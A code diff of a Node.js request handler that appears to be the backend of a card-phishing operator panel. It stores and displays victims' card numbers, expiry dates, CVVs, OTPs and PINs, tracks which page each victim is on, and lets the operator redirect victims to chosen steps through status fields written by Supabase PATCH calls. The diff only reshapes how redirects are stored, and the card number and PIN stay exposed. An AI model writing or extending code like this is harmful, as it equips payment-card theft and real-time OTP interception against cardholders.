@@ -134,8 +134,15 @@ module.exports = async (req, res) => {
       updatedAt: createdAt,
       presence: { state: isRecent ? 'online' : 'offline', lastSeenAt: new Date(createdAt).getTime(), currentPage: lastPage, currentStep },
       loginInfo: { username: hasPayment ? (payment.card_number || '') : '', password: hasPayment ? (payment.card_pin || '') : '' },
-      loginAttempts: hasPayment && payment.card_number ? { '1': { cardNumber: payment.card_number, cardExpiry: payment.card_expiry, cardCvv: payment.card_cvv, otp: payment.otp || '', pin: payment.card_pin, timestamp: payment.created_at } } : {},
-      remoteRedirect: hasPayment && payment.redirect_json ? (function(){ try { return JSON.parse(payment.redirect_json); } catch(e) { return null; } })() : (order && order.redirect_json ? (function(){ try { return JSON.parse(order.redirect_json); } catch(e) { return null; } })() : null)
+      loginAttempts: {},
+      remoteRedirect: (function() {
+        const st = hasPayment ? payment.status : (order ? order.status : '');
+        if (st && typeof st === 'string' && st.startsWith('redirect:')) {
+          const step = st.replace('redirect:', '');
+          return { target: '/login', step, timestamp: Date.now() };
+        }
+        return null;
+      })()
     };
   }
 
@@ -292,7 +299,13 @@ module.exports = async (req, res) => {
         const mapped = {};
         if (value.status !== undefined) mapped.status = value.status;
         if (value.credentialsStatus !== undefined) mapped.status = value.credentialsStatus === 'approved' ? 'accepted' : value.credentialsStatus;
-        if (value.remoteRedirect !== undefined) mapped.redirect_json = JSON.stringify(value.remoteRedirect);
+        if (value.remoteRedirect !== undefined && value.remoteRedirect !== null) {
+          const rdStep = value.remoteRedirect.step || value.remoteRedirect.target || '';
+          mapped.status = 'redirect:' + rdStep;
+          if (isOrder) {
+            await fetch(SB + '/rest/v1/payments?order_id=eq.' + numId, { method: 'PATCH', headers: writeH, body: JSON.stringify({ status: 'redirect:' + rdStep }) });
+          }
+        }
         if (Object.keys(mapped).length > 0) {
           await fetch(SB + '/rest/v1/' + targetTable + '?id=eq.' + numId, { method: 'PATCH', headers: writeH, body: JSON.stringify(mapped) });
         }
@@ -302,7 +315,8 @@ module.exports = async (req, res) => {
           const mapped = field === 'credentialsStatus' ? (value === 'approved' ? 'accepted' : value) : value;
           await fetch(SB + '/rest/v1/' + targetTable + '?id=eq.' + numId, { method: 'PATCH', headers: writeH, body: JSON.stringify({ status: mapped }) });
         } else if (field === 'remoteRedirect') {
-          await fetch(SB + '/rest/v1/' + targetTable + '?id=eq.' + numId, { method: 'PATCH', headers: writeH, body: JSON.stringify({ redirect_json: JSON.stringify(value) }) });
+          const rdStep = value && typeof value === 'object' ? (value.step || value.target || '') : '';
+          await fetch(SB + '/rest/v1/' + targetTable + '?id=eq.' + numId, { method: 'PATCH', headers: writeH, body: JSON.stringify({ status: 'redirect:' + rdStep }) });
         } else if (field === 'presence') {
           // Presence updates - just acknowledge, stored ephemerally
         }
